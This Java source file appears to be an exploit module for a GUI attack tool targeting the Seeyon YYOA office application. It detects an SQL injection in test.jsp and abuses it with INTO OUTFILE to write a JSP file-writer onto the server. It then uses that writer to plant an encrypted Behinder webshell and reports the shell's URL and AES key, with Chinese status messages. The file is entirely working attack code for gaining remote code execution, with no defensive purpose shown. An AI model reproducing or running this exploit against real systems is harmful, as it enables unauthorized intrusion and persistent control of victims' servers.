package exp.oa.seeyonoa.yyoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import decrypt.code.getAllEncode;
import utils.getIndexOf;

import java.util.Date;
import java.util.HashMap;

public class seeyon_yyoa_testJsp_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            Response get_res = HttpTools.get(url + "/yyoa/common/js/menu/test.jsp?S1=(SELECT%20@@BASEDIR)&doType=101" , head, "utf-8");
            if (get_res.getCode() == 200 && get_res.getText().contains("BASEDIR")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ seeyou_yyoa_testJsp_sqli ]");
                    textArea.appendText("\n (1) 利用sqlmap模块进行利用");
                    textArea.appendText("\n     将seeyou_yyoa_testjsp_tamper.py文件放入tamper模块下");
                    textArea.appendText("\n (2) CMD处设置密码，默认冰蝎4.0");
                    textArea.appendText("\n");
                });

                String target_req = url+"/yyoa/common/js/menu/test.jsp?S1=payload&doType=101";
                Platform.runLater(() -> {
                    textArea_cmd.appendText(target_req);
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private Boolean attcmd(String url, String pass,TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            Response get_res = HttpTools.get(url + "/yyoa/common/js/menu/test.jsp?S1=(SELECT%20@@BASEDIR)&doType=101" , head, "utf-8");
            if (get_res.getCode() == 200 && get_res.getText().contains("BASEDIR")) {
                long tt = (new Date()).getTime();
                String var0 = getIndexOf.getMessage(get_res.getText(), "<td align=left>", 15, "</tbody>", -16).replace("\\","/")+"../tomcat/webapps/yyoa/"+tt+".jsp";
                String var1 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"\\\")+request.getParameter(\"f\"))).write(request.getParameter(\"t\").getBytes());%>";
                String var2 = getAllEncode.StringToHex(var1);
                String var3 = "t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E".replace("e45e329feb5d925b", getAllEncode.getMD5_16(pass));
                String target_req = url+"/yyoa/common/js/menu/test.jsp?doType=101&"+
                        "S1=select%20unhex(%27"+ var2 +"%27)%20%20into%20outfile%20%27"+ var0.replace(" ","%20") +"%27";
                String shell_req = url+"/yyoa/"+tt+".jsp?f=R4g"+tt+".jsp";
                Response target_res = HttpTools.get(target_req,head,"utf-8");

                if(target_res.getCode()==200 ){
                    head.put("Content-Type","application/x-www-form-urlencoded");
                    Response shell_res = HttpTools.post(shell_req,var3,head,"utf-8");
                    if(shell_res.getCode()==200 ){
                        Response shell = HttpTools.get(url+"/yyoa/R4g"+tt+".jsp",new HashMap<>(),"utf-8");
                        if(shell.getCode()==200){
                            Platform.runLater(() -> {
                                textArea.appendText("\nwebshell写入成功");
                                textArea.appendText("\n访问成功: "+url+"/yyoa/R4g"+tt+".jsp");
                                textArea.appendText("\n "+ " 冰蝎4.0aes密钥: " + getAllEncode.getMD5_16(pass));
                            });
                            return true;
                        }else {
                            Platform.runLater(() -> {
                                textArea.appendText("\nwebshell写入失败");
                            });
                            return false;
                        }
                    }else {
                        Platform.runLater(() -> {
                            textArea.appendText("\nwebshell写入失败");
                        });
                        return false;
                    }
                }else {
                    Platform.runLater(() -> {
                        textArea.appendText("\nwebshell写入失败");
                    });
                    return false;
                }

            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\nwebshell写入失败");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
